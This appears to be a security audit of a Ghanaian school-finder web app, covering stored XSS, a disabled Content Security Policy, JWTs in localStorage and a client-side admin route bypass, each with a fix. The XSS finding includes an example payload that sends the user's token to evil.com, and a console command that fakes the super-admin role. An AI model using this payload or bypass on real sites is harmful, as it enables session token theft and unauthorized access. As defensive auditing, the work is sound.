# SkoolFinder Ghana — Application Security & Threat Model Audit

**Document ID:** `AUDIT-10`  
**Date:** 2026-11-01  
**Auditor:** Application Security Engineer  
**Branch:** `audit/frontend-review`  
**Standard:** OWASP Top 10 (2021) & ASVS Level 2

---

## 1. Executive Summary & Security Posture

The backend API is hardened with **Zod request validation**, **parameterized Supabase SQL queries** (preventing SQL Injection), **bcrypt password hashing**, **strict Express rate limiting**, and **sanitized error handling** (no production stack traces). 

However, the **frontend presentation layer** exhibits vulnerabilities related to **Cross-Site Scripting (XSS)** vectors through unescaped `innerHTML` template string interpolations, **disabled Content Security Policy (CSP)** in Express Helmet, and **vulnerable JWT token storage in `localStorage`**.

### Security Scorecard:
- **Backend & Database Security:** 92 / 100
- **Authentication & Password Hashing:** 88 / 100
- **Input Sanitization & Output Encoding (Frontend):** 45 / 100
- **Content Security Policy & HTTP Headers:** 55 / 100
- **Client-Side Authorization Enforcement:** 70 / 100

**Overall Application Security Score:** **70 / 100**

---

## 2. Threat Analysis & Vulnerability Register

### Vulnerability SEC-01: Stored Cross-Site Scripting (XSS) via Unescaped `.innerHTML`
- **Severity:** High (CVSS: 7.4)
- **Vulnerability Type:** CWE-79 (Improper Neutralization of Input During Web Page Generation)
- **Location:** Across 147 `.innerHTML` assignments in `public/js/views/` and `public/js/components/`
- **Analysis:**
  Review comments, user names, school descriptions, and inquiry tracking notes are interpolated directly into template literals:
  ```javascript
  // In schoolDetailView.js / parentPortalView.js
  reviews.map(r => `
    <div class="review-card">
      <div class="reviewer-name">${r.userName}</div>
      <p class="review-body">${r.comment}</p>
    </div>
  `).join('')
  ```
  If a malicious user submits a review containing `<img src=x onerror="fetch('https://evil.com/steal?token='+localStorage.getItem('skoolfinder_token'))">`, the script will execute in the browser of any parent, school administrator, or regulator viewing that school profile.
- **Remediation:**
  1. Introduce a global sanitization utility `Utils.escapeHTML(str)` in `public/js/state.js` or `public/js/app.js`:
     ```javascript
     function escapeHTML(str) {
       if (typeof str !== 'string') return str ?? '';
       return str.replace(/[&<>"']/g, m => ({
         '&': '&amp;',
         '<': '&lt;',
         '>': '&gt;',
         '"': '&quot;',
         "'": '&#039;'
       }[m]));
     }
     ```
  2. Sanitize all user-generated fields before interpolating into template strings.

---

### Vulnerability SEC-02: Content Security Policy Disabled in Helmet Middleware
- **Severity:** Medium (CVSS: 6.1)
- **Location:** `server.js` (lines 28–30)
  ```javascript
  app.use(helmet({
    contentSecurityPolicy: false // Allow inline scripts and external fonts/styles used by frontend
  }));
  ```
- **Analysis:**
  Disabling CSP entirely leaves the application defenseless if any XSS injection succeeds. An attacker can execute inline scripts, connect to external domains, and exfiltrate authentication tokens.
- **Remediation:**
  Enable a strict Content Security Policy allowing only trusted CDNs (Google Fonts, unpkg Leaflet, Paystack, Vercel analytics):
  ```javascript
  app.use(helmet({
    contentSecurityPolicy: {
      directives: {
        defaultSrc: ["'self'"],
        scriptSrc: ["'self'", "'unsafe-inline'", "https://unpkg.com", "https://js.paystack.co"],
        styleSrc: ["'self'", "'unsafe-inline'", "https://fonts.googleapis.com", "https://unpkg.com"],
        fontSrc: ["'self'", "https://fonts.gstatic.com"],
        imgSrc: ["'self'", "data:", "https://*.openstreetmap.org", "https://*.supabase.co"],
        connectSrc: ["'self'", "https://*.supabase.co", "https://api.paystack.co"]
      }
    }
  }));
  ```

---

### Vulnerability SEC-03: JWT Storage in Browser `localStorage`
- **Severity:** Medium (CVSS: 5.8)
- **Location:** `public/js/state.js` (`localStorage.setItem('skoolfinder_token', token)`)
- **Analysis:**
  Tokens stored in `localStorage` are accessible to any JavaScript execution on the origin. In contrast, `HttpOnly`, `Secure`, `SameSite=Strict` cookies are invisible to JavaScript, neutralizing token theft via XSS.
- **Remediation:**
  For long-term roadmap, transition session tokens to `HttpOnly` cookies. In the interim, strictly mitigate XSS vectors (SEC-01 and SEC-02) to protect localStorage.

---

### Vulnerability SEC-04: Client-Side Mutable Role Bypass on Route Guarding
- **Severity:** Medium (CVSS: 5.3)
- **Location:** `public/js/app.js` (lines 26–36)
- **Analysis:**
  Route guarding for `/admin` checks `State.isAuthenticated() && State.isSuperAdmin()`. A malicious user can execute `State.currentUser = { role: 'super_admin' }; App.navigate('admin')` in the developer console to render the Admin UI.
  While backend API routes properly reject unauthorized API calls with 401/403, exposing the administrative interface structure to unauthorized clients reveals operational surface area.
- **Remediation:**
  Before mounting `AdminView`, trigger a background `API.getMe()` handshake to cryptographically verify user claims against the server before rendering administrative elements.

---

## 3. Compliance & Data Protection (Ghana Data Protection Act, 2012 / Act 843)

1. **Student Biometric & Medical Records:**  
   The platform handles sensitive student records (blood groups, medical notes in sickbay logs, emergency contacts).
   - *Status:* Data in transit is encrypted via HTTPS (TLS 1.3 on Vercel).
   - *Recommendation:* Ensure sickbay medical logs are restricted to school medical officers and parents of that specific child via Supabase RLS.
2. **Consent & Privacy Policy:**  
   The platform includes a dedicated `openPolicyModal('privacy')` articulating parent rights, school vetting standards, and NaSIA accreditation references.
